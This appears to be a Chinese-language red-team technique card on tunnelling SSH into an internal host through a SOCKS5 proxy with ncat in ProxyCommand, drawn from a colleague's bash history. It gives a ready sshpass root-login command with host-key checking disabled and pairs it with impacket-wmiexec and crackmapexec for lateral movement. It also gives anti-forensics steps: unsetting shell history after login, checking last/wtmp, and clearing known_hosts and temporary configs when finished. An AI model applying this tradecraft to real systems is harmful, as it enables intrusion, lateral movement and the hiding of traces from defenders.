# 案例课：`ncat --proxy` 单跳 SSH，替掉 proxychains 的全局劫持

> 来源：同行作业机 .bash_history + 本机复现（2026-10）· 域：redteam-framework / 隧道
> 原文与凭据不入库；本文只留可复用手法。

## 一句话

要穿一层 SOCKS5 去打内网 SSH 时，**别用 proxychains 劫持全局**：把 `ncat --proxy` 塞进 `ProxyCommand` 只影响这一条连接，DNS 不劫持、keepalive 正常、Node/Python 也不会再报 `224.0.0.1: refused`。

## 前提 / 指纹

- 已有一个可用 SOCKS5（SSH `-D`、chisel、frp、代理池都行）
- 本机装了 nmap 套件（自带 `ncat`）
- 目标 SSH 可达于代理侧，且代理允许 CONNECT 到 22

## 链

```bash
sshpass -p '<pw>' ssh \
  -o ProxyCommand="ncat --proxy <socks_host>:<port> --proxy-type socks5 --proxy-auth u:p %h %p" \
  -o ServerAliveInterval=10 -o ServerAliveCountMax=6 -o StrictHostKeyChecking=no \
  root@<内网IP>
```

- 只影响这一条 ssh 进程，不动 `/etc/proxychains4.conf`
- keepalive 参数必须有：长命令（dump/打包）走代理时，无 keepalive 会被中间设备 5 分钟掐断
- 登录后第一件事：`unset HISTFILE HISTSIZE HISTFILESIZE; set +o history`
- 内网横向组合：`proxychains4 -f /tmp/pc.conf impacket-wmiexec` / `crackmapexec smb` 打 NTLM，SSH 面走上面的单跳

## 判据与边界

- 命中判据：`ssh -v` 里出现 `Connection established` 且 `Authenticated to <ip>`；代理侧能看到 CONNECT 记录
- 失败边界：
  - `ncat: Proxy connection failed` → 代理不支持 CONNECT 22，换 `--proxy-type http` 或先 socks 进去再跳
  - 代理需要认证但用了 `--proxy-auth u:p` 仍 407 → 试 base64 内联或 `--proxy-auth-type basic`
  - 目标只开 IPv6 → `%h %p` 需 `-6`
  - UDP/DNS 走代理：`ncat` 不支持 UDP over SOCKS5，DNS 要么本地解析要么目标侧解析
- 同族变体：`ssh -o ProxyCommand="nc -X 5 -x host:port %h %p"`（OpenBSD nc）、`ssh -J`（多跳 SSH，需前跳可登录）、`socat` 链

## 检查清单

- [ ] 先 `ncat --proxy ... -z <ip> 22` 单独验通，再上 ssh
- [ ] 加 keepalive 与 `-o TCPKeepAlive=yes`
- [ ] 登录后立刻关 history，并检查目标是否记录 `last`/`wtmp`
- [ ] 隧道跑长任务时用 `tmux`，别挂在前台 ssh 上
- [ ] 收尾清 `~/.ssh/known_hosts` 新增项与本机临时 conf
